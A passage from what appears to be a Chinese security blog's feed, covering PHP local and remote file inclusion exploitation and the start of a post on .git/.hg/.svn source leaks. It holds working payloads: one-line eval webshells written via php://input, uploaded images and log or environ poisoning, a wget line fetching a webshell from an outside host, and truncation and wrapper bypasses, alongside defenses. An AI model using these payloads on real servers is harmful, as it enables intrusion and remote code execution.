alt="在这里插入图片描述"><br><strong>漏洞利用</strong></p><p>通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。</p><p>当访问<code>http://www.XXXX.com/LFI2.php?ctfs=&lt;?php phpinfo();?&gt;</code>后，会在<code>/var/lib/php/sessions</code>目录下存储session的值。<br><img src="http://img-blog.csdnimg.cn/20190820202537100.jpg" alt="在这里插入图片描述"><br>本地查看是否存储成功<br><img src="http://img-blog.csdnimg.cn/20190820202810151.jpg" alt="在这里插入图片描述"><br>攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。<br><img src="http://img-blog.csdnimg.cn/20190820204407181.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当然也可以把<code>&lt;?php phpinfo();?&gt;</code>换成一句话木马<code>&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</code>：<br><img src="http://img-blog.csdnimg.cn/20190820205855553.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="3-有限制本地文件包含漏洞"><a href="#3-有限制本地文件包含漏洞" class="headerlink" title="3.有限制本地文件包含漏洞"></a>3.有限制本地文件包含漏洞</h5><p><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php$filename  = $_GET[&#39;filename&#39;];include($filename . &quot;.html&quot;);?&gt;</code></pre><p><strong>1、%00截断</strong></p><p><strong>条件</strong>：magic_quotes_gpc = Off php版本&lt;5.3.4<br><strong>测试结果</strong>：</p><blockquote><p><a href="http://www.filename.com/LFI3.php?filename=phpinfo.php%00" target="_blank" rel="noopener">http://www.filename.com/LFI3.php?filename=phpinfo.php%00</a></p></blockquote><p><img src="http://img-blog.csdnimg.cn/20190821154559964.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2、路径长度截断</strong></p><p><strong>条件</strong>：windows OS，点号需要长于256；linux OS 长于4096</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；<br>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p></blockquote><p><strong>EXP</strong>：</p><pre><code class="php">http://www.filename.com/LFI3.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></pre><p><img src="http://img-blog.csdnimg.cn/20190821154948152.jpg" alt="在这里插入图片描述"></p><p><strong>3、点号截断</strong></p><p><strong>条件</strong>：windows OS，点号需要长于256<br><strong>EXP</strong>：</p><pre><code class="php">http://www.filename.com/LFI3.php?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</code></pre><p><img src="http://img-blog.csdnimg.cn/20190821162227475.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2、远程文件包含漏洞"><a href="#2、远程文件包含漏洞" class="headerlink" title="2、远程文件包含漏洞"></a>2、远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p><blockquote><p>allow_url_fopen = On(是否允许打开远程文件)<br>allow_url_include =On(是否允许include/require远程文件)</p></blockquote><h5 id="1-无限制远程文件包含漏洞"><a href="#1-无限制远程文件包含漏洞" class="headerlink" title="1.无限制远程文件包含漏洞"></a>1.无限制远程文件包含漏洞</h5><p><strong>测试代码</strong>：</p><pre><code>&lt;?php$filename  = $_GET[&#39;filename&#39;];include($filename);?&gt;</code></pre><p><strong>测试结果</strong>：<br>通过远程文件包含漏洞，包含php.txt可以解析。</p><pre><code class="php">http://www.filename.com/RFI1.php?filename=http://192.168.204.128/wenjian/php.txt</code></pre><p><img src="http://img-blog.csdnimg.cn/20190821153634340.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="2-有限制远程文件包含漏洞"><a href="#2-有限制远程文件包含漏洞" class="headerlink" title="2.有限制远程文件包含漏洞"></a>2.有限制远程文件包含漏洞</h5><p><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php$filename  = $_GET[&#39;filename&#39;];include($filename . &quot;.html&quot;);?&gt;</code></pre><p>代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。</p><p><strong>1、问号绕过</strong></p><pre><code class="php">http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt?</code></pre><p><img src="http://img-blog.csdnimg.cn/20190821162327499.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2、#号绕过</strong></p><pre><code class="php">http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt%23</code></pre><p><img src="http://img-blog.csdnimg.cn/20190821162512459.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还有哪些可以绕过？用burp跑一遍发现空格也可以绕过：</p><p><strong>3、空格绕过</strong></p><pre><code class="php">http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt%20</code></pre><p>使用windows环境(把测试代码放在windows的Web目录下)测试失败</p><p><strong>4、%00截断</strong></p><pre><code class="php">http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt%00</code></pre><p><img src="http://img-blog.csdnimg.cn/20190821162910331.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>同样，把<code>php.txt</code>文件内容换成一句话木马<code>&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</code>，可拿到webshell。</p><p><img src="http://img-blog.csdnimg.cn/20190821170340414.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p><blockquote><p>file:// — 访问本地文件系统<br>http:// — 访问 HTTP(s) 网址<br>ftp:// — 访问 FTP(s) URLs<br>php:// — 访问各个输入/输出流（I/O streams）<br>zlib:// — 压缩流<br>data:// — 数据（RFC 2397）<br>glob:// — 查找匹配的文件路径模式<br>phar:// — PHP 归档<br>ssh2:// — Secure Shell 2<br>rar:// — RAR<br>ogg:// — 音频流<br>expect:// — 处理交互式的流</p></blockquote><p><strong>php:// 输入输出流</strong><br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><h4 id="php-filter-本地磁盘文件进行读取"><a href="#php-filter-本地磁盘文件进行读取" class="headerlink" title="php://filter(本地磁盘文件进行读取)"></a>php://filter(本地磁盘文件进行读取)</h4><p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。<br><strong>用法：</strong></p><blockquote><p>?filename=php://filter/convert.base64-encode/resource=xxx.php<br>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</p></blockquote><p>两者效果一样。<br><strong>条件</strong>：只是读取，需要<strong>开启 allow_url_fopen</strong>，不需要开启 allow_url_include；<br><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php$filename = $_GET[&#39;filename&#39;];include($filename);?&gt;</code></pre><p><strong>测试结果</strong>：<br><img src="http://img-blog.csdnimg.cn/20190821183715716.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>php://input</strong><br>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。<br><strong>用法</strong>：?file=php://input 数据利用POST传过去。</p><h4 id="php-input-读取POST数据"><a href="#php-input-读取POST数据" class="headerlink" title="php://input (读取POST数据)"></a>php://input (读取POST数据)</h4><p>碰到<code>file_get_contents()</code>就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；<br><strong>测试代码</strong>：</p><pre><code class="php">&lt;?phpecho file_get_contents(&quot;php://input&quot;);?&gt;</code></pre><p><strong>测试结果</strong>：<br><img src="http://img-blog.csdnimg.cn/20190821184446780.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="php-input-写入木马"><a href="#php-input-写入木马" class="headerlink" title="php://input(写入木马)"></a>php://input(写入木马)</h4><p><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php$filename  = $_GET[&#39;filename&#39;];include($filename);?&gt;</code></pre><p><strong>条件</strong>：php配置文件中需<strong>同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）</strong>,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。<br>如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。</p><blockquote><?PHP fputs(fopen('webshell.php','w'),'<?php @eval($_POST[a])?><p>‘);?&gt;</p></blockquote><p><strong>测试结果</strong>：<br><img src="http://img-blog.csdnimg.cn/20190821184803184.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190821184822178.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h4><p><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php$filename  = $_GET[&#39;filename&#39;];include($filename);?&gt;</code></pre><p><strong>条件</strong>：php配置文件中需<strong>同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）</strong>,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；<br><strong>测试结果</strong>：<br><img src="http://img-blog.csdnimg.cn/20190821185907219.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="file-伪协议-读取文件内容"><a href="#file-伪协议-读取文件内容" class="headerlink" title="file://伪协议 (读取文件内容)"></a>file://伪协议 (读取文件内容)</h4><p>通过file协议可以访问本地文件系统，读取到文件的内容。不受allow_url_fopen与allow_url_include的影响。<br><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php$filename  = $_GET[&#39;filename&#39;];include($filename);?&gt;</code></pre><blockquote><p>用法：file://文件绝对路径  file://C:/Windows/system.ini</p></blockquote><p><strong>测试结果</strong>：<br><img src="http://img-blog.csdnimg.cn/20190821190610430.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>data://伪协议</strong><br>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；</p><blockquote><p>data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p></blockquote><h4 id="data-读取文件"><a href="#data-读取文件" class="headerlink" title="data://(读取文件)"></a>data://(读取文件)</h4><p>和php伪协议的input类似，碰到file_get_contents()来用；</p><blockquote><?php // 打印 “I love PHP” echo file_get_contents(‘data://text/plain;base64,SSBsb3ZlIFBIUAo=’); ?></blockquote><pre><code class="php">注意：&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;闭合;</code></pre><p>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI）<br><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php$filename = $_GET[&#39;filename&#39;];include($filename);?&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190821205306288.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>测试结果</strong>：<br><img src="http://img-blog.csdnimg.cn/20190821205332550.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h4><p>这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。<br><strong>用法</strong>：?file=phar://压缩包/内部文件 <code>phar://xxx.png/webshell.php</code><br><strong>注意</strong>： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br> <strong>步骤</strong>： 写一个一句话木马文件webshell.php，然后用zip协议压缩为webshell.zip，然后将后缀改为png等其他格式。<br><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php$filename  = $_GET[&#39;filename&#39;];include($filename);?&gt;</code></pre><p><strong>测试结果</strong>：</p><p><img src="http://img-blog.csdnimg.cn/20190821210932828.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h4><p>zip伪协议和phar协议类似，但是用法不一样。<br><strong>用法</strong>：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] <code>zip://xxx.png#webshell.php</code>。<br><strong>条件</strong>： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。<br><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php$filename  = $_GET[&#39;filename&#39;];include($filename);?&gt;</code></pre><p><strong>测试结果：</strong><br><img src="http://img-blog.csdnimg.cn/20190821211323261.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="文件包含漏洞利用"><a href="#文件包含漏洞利用" class="headerlink" title="文件包含漏洞利用"></a>文件包含漏洞利用</h3><p><strong>（一）读取敏感文件</strong></p><p><strong>（二）远程包含shell</strong></p><p>allow_url_fopen为ON时，可以尝试远程包含一句话木马。</p><pre><code class="php">访问http://www.xxx.xom/index.php?page=http://www.filename.com/echo.txt，远程http://www.filename.com/下的echo.txt文件内容为：  &lt;?fputs(open(&quot;webshellshell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[a]);?&gt;&quot;)?&gt;</code></pre><p><strong>（三）本地包含配合文件上传</strong></p><p>上传一句话图片木马，得知图片路径(/upload/1.jpg)，图片代码为：</p><pre><code class="php">&lt;?fputs(open(&quot;webshell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[a]);?&gt;&quot;)?&gt;</code></pre><p>访问<code>http://www.xxx.xom/index.php?page=./upload/1.jpg</code>，包含这张图片并在index.php所在目录生成webshell.php。</p><p><strong>（四）使用PHP封装协议</strong></p><p>PHP带有很多内置URL风格的封装协议，这类协议与fopen()、copy()、file_exists()、file size()等文件系统函数所提供的功能类似。<br><em>1、使用封装协议读取PHP文件：</em></p><blockquote><p><a href="http://www.filename.com/RFI1.php?filename=php://filter/read=convert.base64-encode/resource=x.php" target="_blank" rel="noopener">http://www.filename.com/RFI1.php?filename=php://filter/read=convert.base64-encode/resource=x.php</a></p></blockquote><p><img src="http://img-blog.csdnimg.cn/20190821172841144.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><em>2、写入PHP文件：</em></p><blockquote><p><a href="http://www.filename.com/RFI1.php?filename=php://input" target="_blank" rel="noopener">http://www.filename.com/RFI1.php?filename=php://input</a><br>post传参：<?PHP fputs(fopen('webshell.php','w'),'<?php @eval($_POST[a])?>‘);?&gt;</p></blockquote><p><img src="http://img-blog.csdnimg.cn/20190821174017606.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试一下，写马成功<br><img src="http://img-blog.csdnimg.cn/20190821174231836.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>（五）包含Apache日志文件</strong><br>Apache服务器运行后会生成两个日志文件，这两个文件是<code>access.log</code>(访问日志)和<code>error.log</code>(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中。<br><em>日志默认路径</em></p><blockquote><p>(1)apache+Linux日志默认路径/etc/httpd/logs/access_log或者/var/log/httpd/access log<br>(2) apache+win2003日志默认路径<br>(3) IIS6.0+win2003默认日志文件 C:WINDOWSsystem32Logfiles<br>(4) IIS7.0+win2003 默认日志文件 %SystemDrive%inetpublogsLogFiles<br>(5) nginx 日志文件在用户安装目录的logs目录下。如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里。也可通过其配置文件Nginx.conf，获取到日志的存在路径(/opt/nginx/logs/access.log)</p></blockquote><p><em>web中间件默认配置</em></p><blockquote><p>(1) apache+linux 默认配置文件/etc/httpd/conf/httpd.conf或者index.php?page=/etc/init.d/httpd<br>(2)IIS6.0+win2003 配置文件 C:/Windows/system32/inetsrv/metabase.xml<br>(3)IIS7.0+WIN 配置文件 C:WindowsSystem32inetsrvconfigapplicationHost.config</p></blockquote><p><strong>（六）截断包含</strong><br>只适用于magic_quotes_gpc=off的情况，如果为on，%00（NULL）将会被转义，从而无法正常截断。<br><strong>（七）绕过WAF防火墙</strong><br><strong>（八）包含session</strong><br>参考本地文件包含漏洞：session文件包含漏洞<br><strong>（九）包含/proc/self/environ文件</strong></p><ul><li>利用条件：<br>1、php以cgi方式运行，这样environ才会保持UA头。<br>2、environ文件存储位置已知，且environ文件可读。</li><li>姿势：<br>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。 之后再包含它，即可。<br>?file=../../../../../../../proc/self/environ 选择User-Agent</li></ul><p>写代码如下：</p><pre><code class="php"> &lt;?system(&#39;wget http://www.yourweb.com/oneword.txt -O webshell.php&#39;);?&gt;</code></pre><p>然后提交请求。<br><strong>（十）包含临时文件</strong><br>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临 时文件被删除之前，利用竞争即可包含该临时文件。</p><p>由于包含需要知道包含的文件名。<br>方法一：进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有 65535中不同的文件名，所以这个方法是可行的。<br>方法二：phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell</p><h3 id="文件包含漏洞防御"><a href="#文件包含漏洞防御" class="headerlink" title="文件包含漏洞防御"></a>文件包含漏洞防御</h3><blockquote><p>1、严格判断包含中的参数是否外部可控。<br>2、路径限制<br>3、包含文件验证<br>4、尽量不要使用动态包含，可以在需要包含的页面固定写好<br>5、PHP 中使用 open_basedir 配置限制访问在指定的区域<br>6、过滤.（点）/（反斜杠）\（反斜杠）<br>7、禁止服务器远程文件包含</p></blockquote><p><strong>绕过有防御的本地文件包含</strong></p><pre><code class="php">&lt;?php$file = $_GET[&#39;file&#39;];include &#39;/var/www/html/&#39;.$file.&#39;/test/test.php&#39;; ?&gt;</code></pre><p>这段代码指定了前缀和后缀:这样就很“难”直接去包含前面提到的种种文件。</p><p><strong>绕过有防御的远程文件包含</strong></p><pre><code class="php">&lt;?php$basePath = $_GET[&#39;path&#39;];require_once $basePath . &quot;/action/m_share.php&quot;; ?&gt;</code></pre><p>参考博客：<br><a href="http://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">文件包含漏洞</a><br><a href="http://www.jianshu.com/p/3514f0fd79f7" target="_blank" rel="noopener">文件包含漏洞学习总结</a></p><h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h3><p>学文件包含漏洞，了解了php伪协议和文件包含漏洞的基础知识。收获很大，继续努力。<br>小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 文件包含漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
            <tag> 漏洞基础 </tag>
            
            <tag> 漏洞绕过 </tag>
            
            <tag> PHP伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见Web源码泄露</title>
      <link href="/2019/08/15/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
      <url>/2019/08/15/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><h4 id="源码泄露漏洞成因"><a href="#源码泄露漏洞成因" class="headerlink" title="源码泄露漏洞成因"></a>源码泄露漏洞成因</h4><p>把网站部署在某一个虚拟主机上面，然后把代码先打包压缩后上传，上传成功后再去服务器解压。虽然解决了上传速度慢的问题。但压缩包解压后如果没有删除，当攻击者发现后就可以把代码压缩包下载；因为部署到服务器上的都是源代码，这时候攻击者就可以通过代码进一步挖掘一些安全漏洞：文件上传，SQL 注入等等。</p><h3 id="0x01-git源码泄漏"><a href="#0x01-git源码泄漏" class="headerlink" title="0x01 .git源码泄漏"></a>0x01 .git源码泄漏</h3><p>当在一个空目录执行 <code>git init</code> 时，Git 会创建一个 <code>.git</code> 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了。<br>该目录的结构：</p><pre><code class="c">HEAD config* description hooks/ info/ objects/ refs/</code></pre><ul><li>description 文件仅供 GitWeb 程序使用，无需关心。</li><li>config 文件包含项目特有的配置选项；</li><li>info 目录包含一个全局性排除(global exclude)文件，用以放置不希望被记录在 .gitignore<br>文件中的忽略模式(ignored patterns)；</li><li>hooks 目录包含客户端或服务端的钩子脚本(hook scripts)</li></ul><p>下面的四个很重要：</p><ul><li>HEAD 文件指示目前被检出的分支；</li><li>index 文件保存暂存区信息；</li><li>objects 目录存储所有数据内容；</li><li>refs 目录存储指向数据(分支)的提交对象的指针。</li></ul><p><strong>1、漏洞成因</strong></p><p>在发布代码的时候，如果没有把 <code>.git</code> 这个目录删除，直接发布到了运行目录中。攻击者就可以通过这个文件夹，可以用来恢复源代码。<br>eg：</p><pre><code class="php">http://www.example.com/.git/</code></pre><p><strong>2、漏洞利用</strong></p><p><em>常规利用</em><br>下载整个目录, 然后用git命令回滚整个项目:</p><pre><code class="php">wget -r --no-parent --mirror http://www.example.com/.gitcd www.example.com &amp;&amp; git reset --hard</code></pre><p><em>工具</em><br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p><pre><code class="php">GitHack.py http://www.example.com/.git/</code></pre><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><pre><code class="php">rip-git.pl -v -u http://www.example.com/.git/</code></pre><p><strong>3、修复建议</strong></p><p>1.删除.git<br>2.在Nginx添加中URL重写判断来禁止访问这个.git目录下的内容：</p><pre><code class="php">  rewrite ^/.git/ http://www.example.com/; #Fix git issues</code></pre><p>配置WEB服务器(apache/nginx等)来拒绝对.git路径的访问, 但也会出现被意外绕过的风险.<br>最好的办法就是在项目新建一个<code>www</code>目录来存放源代码文件.</p><h3 id="0x02-hg源码泄漏"><a href="#0x02-hg源码泄漏" class="headerlink" title="0x02 .hg源码泄漏"></a>0x02 .hg源码泄漏</h3><p>Mercurial的意思是水银，所以缩写成hg(汞), 也是一个版本管理软件.。用法和git有点类似,，但也保留了svn命令简明的特点，而且原生地支持Windows/MacOS/Linux三大平台， 不像git需要MinGW才得以运行,，所以当今也有不少人偏向于用hg做版本控制。</p><p><strong>1、漏洞成因</strong></p><p><code>hg init</code>的时候会生成<code>.hg</code><br>eg：</p><pre><code class="php">http://www.example.com/.hg/</code></pre><p><strong>2、漏洞利用</strong></p><p><em>工具</em><br><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><pre><code class="php">rip-hg.pl -v -u http://www.example.com/.hg/</code></pre><p><strong>3、修复建议</strong></p><p>删除.hg</p><h3 id="0x03-svn源码泄漏"><a href="#0x03-svn源码泄漏" class="headerlink" title="0x03 .svn源码泄漏"></a>0x03 .svn源码泄漏</h3><p>SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。很多网站都使用了SVN版本控制系统，和使用 git 版本控制器类似。</p><p><strong>1、漏洞成因</strong></p><p>在使用SVN管理本地代码过程中，会自动生成一个名为<code>.svn</code>的隐藏文件夹，其中包含重要的源代码信息。但开发者在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使<code>.svn</code>隐藏文件夹被暴露于外网环境。</p><p>攻击者可以借助其中包含的用于版本信息追踪的<code>entries</code>文件，逐步摸清站点结构，并且也可以使用工具 dvcs-ripper下载网站源码。<br>eg：</p><pre><code class="php">http://www.example.com/.svn/entries</code></pre><p><strong>2、漏洞利用</strong></p><p><em>工具</em></p><p><a 